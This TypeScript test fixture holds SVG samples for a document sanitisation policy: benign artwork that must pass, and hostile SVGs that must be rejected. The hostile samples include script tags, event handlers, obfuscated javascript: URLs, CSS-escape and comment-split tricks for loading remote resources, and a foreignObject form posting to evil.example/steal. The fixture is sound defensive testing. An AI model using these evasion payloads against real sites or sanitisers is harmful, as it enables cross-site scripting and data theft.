/**
 * SVG documents for the document-policy and preview tests: ordinary artwork
 * that must be accepted, and hostile documents that must not affect the app
 * or survive into a saved file.
 */
const NS = 'xmlns="http://www.w3.org/2000/svg"';
const XLINK = 'xmlns:xlink="http://www.w3.org/1999/xlink"';

/** Accepted: real-world features the preview must keep. */
export const ACCEPTED_SVGS: Record<string, string> = {
  'a plain icon': `<svg ${NS} viewBox="0 0 24 24"><path d="M4 12l5 5 11-11" fill="none" stroke="#000"/></svg>`,
  'an XML declaration, a public DOCTYPE and comments': `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<!-- generated -->
<svg ${NS} viewBox="0 0 10 10"><rect width="10" height="10"/></svg>
<!-- end -->`,
  'gradients and url(#id) references': `<svg ${NS} ${XLINK} viewBox="0 0 10 10">
  <defs><linearGradient id="g"><stop offset="0" stop-color="red"/><stop offset="1" stop-color="blue"/></linearGradient>
  <symbol id="dot"><circle r="2"/></symbol></defs>
  <rect width="10" height="10" fill="url(#g)" style="filter: url( '#g' )"/>
  <use href="#dot" x="5" y="5"/><use xlink:href="#dot" x="2" y="2"/>
</svg>`,
  'a <style> block with CSS animation': `<svg ${NS} viewBox="0 0 10 10">
  <style><![CDATA[
    @keyframes spin { to { transform: rotate(360deg); } }
    .spinner { animation: spin 1s linear infinite; transform-origin: center; }
    a > b { fill: #f00; }
  ]]></style>
  <circle class="spinner" cx="5" cy="5" r="4"/>
</svg>`,
  'SMIL animation': `<svg ${NS} viewBox="0 0 10 10"><circle r="2">
  <animate attributeName="r" values="2;4;2" dur="1s" repeatCount="indefinite"/>
  <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="2s"/>
  <set attributeName="fill" to="blue" begin="1s"/>
</circle></svg>`,
  'text with entities': `<svg ${NS} viewBox="0 0 100 20"><text x="0" y="15">Fish &amp; chips &lt;3 &#x2764;</text></svg>`,
  'an embedded PNG image': `<svg ${NS} viewBox="0 0 1 1"><image href="data:image/png;base64,iVBORw0KGgo=" width="1" height="1"/></svg>`,
  'an embedded data: font': `<svg ${NS} viewBox="0 0 10 10"><style>@font-face { font-family: X; src: url(data:font/woff2;base64,d09GMgAB) format('woff2'); }</style><text>Hi</text></svg>`,
  'a namespaced root': `<svg:svg xmlns:svg="http://www.w3.org/2000/svg" viewBox="0 0 1 1"><svg:rect width="1" height="1"/></svg:svg>`,
  'a lower-case utf-8 XML declaration': `<?xml version="1.0" encoding="utf-8" standalone="no"?><svg ${NS}/>`,
  'an XML declaration without an encoding': `<?xml version='1.0'?>\n<svg ${NS}/>`,
  'element and attribute names that are also Object members': `<svg ${NS}><constructor toString="1"/><g><animate attributeName="constructor" dur="1s"/></g></svg>`,
  'a typical code-model SVG': `<svg ${NS} ${XLINK} viewBox="0 0 64 64" role="img" aria-label="Pixel's (beta) badge" data-name="badge">
  <title>Badge</title>
  <desc>A rounded badge: gradient fill, a soft shadow and a pulsing dot.</desc>
  <defs>
    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1" gradientUnits="objectBoundingBox">
      <stop offset="0%" stop-color="#ff6b2d"/><stop offset="100%" stop-color="#8c2a13"/>
    </linearGradient>
    <radialGradient id="glow" cx="50%" cy="40%" r="60%" xlink:href="#bg"/>
    <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
      <feGaussianBlur in="SourceAlpha" stdDeviation="1.5"/><feOffset dy="1" result="o"/>
      <feMerge><feMergeNode in="o"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
    <clipPath id="clip"><circle cx="32" cy="32" r="30"/></clipPath>
    <mask id="fade"><rect width="64" height="64" fill="url(#glow)"/></mask>
    <path id="spark" d="M0-4L1-1 4 0 1 1 0 4-1 1-4 0-1-1Z"/>
  </defs>
  <style>
    /* Palette (warm) — don't use pure black; it's too harsh */
    .ring { fill: none; stroke: url(#bg); stroke-width: 2; }
    .label { font: 600 10px/1.2 'Segoe UI', "Helvetica Neue", sans-serif; fill: #fff; }
    .dot { animation: pulse 1.2s ease-in-out infinite alternate; transform-origin: 48px 16px; }
    @keyframes pulse { from { transform: scale(0.8); opacity: .6 } to { transform: scale(1.1); opacity: 1 } }
    @media (prefers-reduced-motion: reduce) { .dot { animation: none; } }
  </style>
  <g clip-path="url(#clip)" filter="url( #shadow )" mask="url('#fade')">
    <rect width="64" height="64" rx="12" fill="url(#bg)"/>
  </g>
  <circle class="ring" cx="32" cy="32" r="28"/>
  <use href="#spark" x="16" y="16" fill="#fff"/><use xlink:href="#spark" x="48" y="48" fill="#fff"/>
  <circle class="dot" cx="48" cy="16" r="3" fill="#7fd7ff">
    <animate attributeName="r" values="3;4;3" dur="2s" repeatCount="indefinite"/>
  </circle>
  <text class="label" x="32" y="36" text-anchor="middle" xml:space="preserve">Hi &amp; bye</text>
</svg>`,
};

/** Rejected by the policy, with the phrase the rejection reason must contain. */
export const REJECTED_SVGS: Record<string, { svg: string; reason: string }> = {
  'a <script> element': {
    svg: `<svg ${NS}><script>parent.postMessage('x', '*')</script></svg>`,
    reason: '<script>',
  },
  'an upper-case, namespaced <script>': {
    svg: `<svg ${NS} xmlns:s="http://www.w3.org/2000/svg"><s:SCRIPT>alert(1)</s:SCRIPT></svg>`,
    reason: '<script>',
  },
  'an onload handler': {
    svg: `<svg ${NS} onload="alert(1)"><rect/></svg>`,
    reason: 'event handler attribute (onload)',
  },
  'an unquoted handler on a child': {
    svg: `<svg ${NS}><rect onclick=alert(1) /></svg>`,
    reason: 'event handler attribute (onclick)',
  },
  'a SMIL onbegin handler': {
    svg: `<svg ${NS}><animate attributeName="x" onbegin="alert(1)" dur="1s"/></svg>`,
    reason: 'event handler',
  },
  'a <foreignObject> form': {
    svg: `<svg ${NS}><foreignObject width="100" height="40"><form xmlns="http://www.w3.org/1999/xhtml" action="https://evil.example/steal"><input name="k"/></form></foreignObject></svg>`,
    reason: '<foreignObject>',
  },
  'an external <image href>': {
    svg: `<svg ${NS}><image href="https://tracker.example/pixel.png" width="1" height="1"/></svg>`,
    reason: 'external resource (https://tracker.example/pixel.png)',
  },
  'an external xlink:href on <use>': {
    svg: `<svg ${NS} ${XLINK}><use xlink:href="sprites.svg#icon"/></svg>`,
    reason: 'external resource (sprites.svg#icon)',
  },
  'an external link': {
    svg: `<svg ${NS}><a href="https://evil.example/"><rect width="10" height="10"/></a></svg>`,
    reason: 'external resource',
  },
  'a javascript: link': {
    svg: `<svg ${NS}><a href="javascript:alert(1)"><rect/></a></svg>`,
    reason: 'javascript: URL',
  },
  'an entity-encoded javascript: link': {
    svg: `<svg ${NS} ${XLINK}><a xlink:href="&#106;ava&#x09;script&#58;alert(1)"><rect/></a></svg>`,
    reason: 'javascript: URL',
  },
  'SMIL rewriting a link to javascript:': {
    svg: `<svg ${NS}><a href="#"><set to="javascript:alert(1)" attributeName="href"/><rect/></a></svg>`,
    reason: 'javascript: URL',
  },
  'SMIL rewriting a link target': {
    svg: `<svg ${NS}><a href="#"><animate attributeName="xlink:href" values="#a;#b" dur="1s"/><rect/></a></svg>`,
    reason: 'SMIL on href',
  },
  'a remote fill url()': {
    svg: `<svg ${NS}><rect fill="url(https://evil.example/paint.svg#p)"/></svg>`,
    reason: 'external resource (https://evil.example/paint.svg#p)',
  },
  'a stylesheet @import': {
    svg: `<svg ${NS}><style>@import url("https://fonts.example/css");</style><text>Hi</text></svg>`,
    reason: '@import',
  },
  'an entity-encoded @import inside <style>': {
    svg: `<svg ${NS}><style>&#64;import 'https://evil.example/x.css';</style></svg>`,
    reason: '@import',
  },
  'a CSS-escaped remote url()': {
    svg: `<svg ${NS}><style>rect { background: \\75 rl(https://evil.example/x.png); }</style></svg>`,
    reason: 'external resource',
  },
  'a comment-split @import': {
    svg: `<svg ${NS}><style>@im/**/port url(x.css);</style></svg>`,
    reason: '@import',
  },
  'a protocol-relative image': {
    svg: `<svg ${NS}><image href="//evil.example/x.png"/></svg>`,
    reason: 'external resource',
  },
  'a remote filter image': {
    svg: `<svg ${NS}><filter id="f"><feImage href="https://evil.example/x.png"/></filter></svg>`,
    reason: 'external resource',
  },
  'a remote xml:base': {
    svg: `<svg ${NS} xml:base="https://evil.example/"><image href="#x"/></svg>`,
    reason: 'external resource',
  },
  'a NUL-split javascript: URL': {
    svg: `<svg ${NS}><a href="java&#0;script:alert(1)"><rect/></a></svg>`,
    reason: 'javascript: URL',
  },
  'a nested SVG data URL': {
    svg: `<svg ${NS}><image href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0Lz48L3N2Zz4=" width="1" height="1"/></svg>`,
    reason: 'external resource',
  },
  'an HTML data URL': {
    svg: `<svg ${NS}><a href="data:text/html,<script>alert(1)</script>"><rect/></a></svg>`,
    reason: 'data:text/html',
  },
  'an xml-stylesheet processing instruction': {
    svg: `<?xml-stylesheet href="https://evil.example/x.css"?><svg ${NS}/>`,
    reason: 'processing instruction',
  },
  'entity definitions in the DOCTYPE': {
    svg: `<!DOCTYPE svg [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><svg ${NS}><text>&lol2;</text></svg>`,
    reason: 'defines entities',
  },
  'an HTML root': {
    svg: `<html><body><svg ${NS}/></body></html>`,
    reason: '<svg> root',
  },
  'two root elements': {
    svg: `<svg ${NS}/><svg ${NS}/>`,
    reason: 'content after its </svg>',
  },
  'an unclosed element': {
    svg: `<svg ${NS}><g><rect/></svg>`,
    reason: "isn't well-formed",
  },
  'control characters': {
    svg: `<svg ${NS}><scr\u0000ipt/></svg>`,
    reason: 'control characters',
  },
  'an unpaired surrogate': {
    svg: `<svg ${NS}><text>\ud800</text></svg>`,
    reason: 'control characters',
  },

  // Round-5 adversarial review (ledger R5-*). Benign structure only.
  'a self-closing element whose name has a non-ASCII letter (R5-S1)': {
    svg: `<svg ${NS}><gé/></svg>`,
    reason: "isn't well-formed",
  },
  'an element whose prefix has a non-ASCII letter (R5-S1)': {
    svg: `<svg ${NS}><pé:rect width="1" height="1"/></svg>`,
    reason: "isn't well-formed",
  },
  'an attribute name with a non-ASCII letter (R5-S1)': {
    svg: `<svg ${NS}><rect é="1"/></svg>`,
    reason: "isn't well-formed",
  },
  'an unterminated url( in <style> (R5-S2)': {
    svg: `<svg ${NS}><style>rect { fill: url(#g</style></svg>`,
    reason: 'url( is never closed',
  },
  'an unterminated url( in an attribute (R5-S2)': {
    svg: `<svg ${NS}><rect fill="url(#g"/></svg>`,
    reason: 'url( is never closed',
  },
  'a CSS-escaped url() in a presentation attribute (R5-S3)': {
    svg: `<svg ${NS}><rect fill="\\75 rl(https://evil.example/p.svg#p)"/></svg>`,
    reason: 'external resource (https://evil.example/p.svg#p)',
  },
  'an entity-encoded CSS escape in a presentation attribute (R5-S3)': {
    svg: `<svg ${NS}><rect stroke="&#92;55RL(https://evil.example/p.svg#p)"/></svg>`,
    reason: 'external resource',
  },
  'a remote url() inside SMIL values (R5-S3)': {
    svg: `<svg ${NS}><rect><animate attributeName="fill" values="red;u\\rl(https://evil.example/p)" dur="1s"/></rect></svg>`,
    reason: 'external resource',
  },
  'comment markers inside CSS strings (R5-S4)': {
    svg: `<svg ${NS}><style>a { content: "/*" } b { background: url(https://evil.example/x.png) } c { content: "*/" }</style></svg>`,
    reason: 'external resource (https://evil.example/x.png)',
  },
  'comment markers inside unquoted url() tokens (R5-S4)': {
    svg: `<svg ${NS}><style>a { background-image: url(#a/*), url(https://evil.example/x.png), url(#b*/) }</style></svg>`,
    reason: 'external resource (https://evil.example/x.png)',
  },
  'an unterminated CSS comment (R5-S4)': {
    svg: `<svg ${NS}><style>rect { fill: red } /* never closed</style></svg>`,
    reason: 'CSS comment is never closed',
  },
  'an XHTML namespace declaration (R5-S5)': {
    svg: `<svg ${NS} xmlns:h="http://www.w3.org/1999/xhtml"><h:SCRIPT>alert(1)</h:SCRIPT></svg>`,
    reason: 'namespace',
  },
  'a default XHTML namespace on a child (R5-S5)': {
    svg: `<svg ${NS}><g xmlns="http://www.w3.org/1999/xhtml"><rect/></g></svg>`,
    reason: "namespace Pixel Minion doesn't allow (http://www.w3.org/1999/xhtml)",
  },
  'an unknown namespace (R5-S5)': {
    svg: `<svg ${NS} xmlns:x="urn:example:unknown"><rect x:y="1"/></svg>`,
    reason: 'namespace',
  },
  'SMIL rewriting xml:base (R5-S6)': {
    svg: `<svg ${NS}><g xml:base="#"><animate attributeName="xml:base" values="#;#" dur="1s"/><rect/></g></svg>`,
    reason: 'SMIL on xml:base',
  },
  'SMIL rewriting src (R5-S6)': {
    svg: `<svg ${NS}><g><set attributeName="src" to="#x"/><rect/></g></svg>`,
    reason: 'SMIL on src',
  },
  'a non-UTF-8 XML encoding (R5-S6)': {
    svg: `<?xml version="1.0" encoding="ISO-2022-JP"?><svg ${NS}/>`,
    reason: 'encoding other than UTF-8 (ISO-2022-JP)',
  },
  'an entity in CDATA that would read as a comment if decoded (R5-S4)': {
    // CDATA is not entity-decoded, so CSS sees "&#47;*", not a comment.
    svg: `<svg ${NS}><style><![CDATA[&#47;*{} ]]>b { background: url(https://evil.example/x.png) } /* */</style></svg>`,
    reason: 'external resource (https://evil.example/x.png)',
  },
  'an unquoted XML encoding (R5-S6)': {
    svg: `<?xml version="1.0" encoding=UTF-16?><svg ${NS}/>`,
    reason: 'encoding other than UTF-8',
  },
  'an element name followed by U+FEFF, a name character in XML (R5-S1)': {
    svg: `<svg ${NS}><rect\ufeff width="1"/></svg>`,
    reason: "isn't well-formed",
  },
  'an XML declaration after other markup (R5-S6)': {
    svg: `<!-- first --><?xml version="1.0"?><svg ${NS}/>`,
    reason: 'XML declaration',
  },
};

/** Generated markup that tries to restyle the app and collide with its ids. */
export const STYLE_LEAK_SVG = `<svg ${NS} id="monitor-frame" viewBox="0 0 10 10">
  <style>
    * { display: none !important; }
    body, .app-container, .settings-overlay { visibility: hidden !important; background: red !important; }
  </style>
  <defs><linearGradient id="skull"><stop offset="0" stop-color="red"/></linearGradient></defs>
  <rect id="pixel-leak-marker" width="10" height="10" fill="url(#skull)"/>
</svg>`;
